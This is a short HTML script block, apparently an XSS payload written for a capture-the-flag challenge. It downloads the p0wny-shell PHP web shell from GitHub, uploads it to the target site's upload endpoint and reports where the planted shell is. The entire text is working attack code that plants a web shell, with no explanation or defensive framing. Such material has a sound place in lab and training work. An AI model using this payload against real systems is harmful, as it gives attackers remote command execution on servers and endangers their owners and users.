<script>
fetch('https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php')
  .then(r => r.text())
  .then(code => {
    const form = new FormData();
    form.append('file', new Blob([code], {type: 'application/x-php'}), 'shell.php');
    fetch('/xss01CTF/upload.php', {method: 'POST', body: form});
  })
  .then(() => alert('Shell: /xss01CTF/upload/shell.php'));
</script>
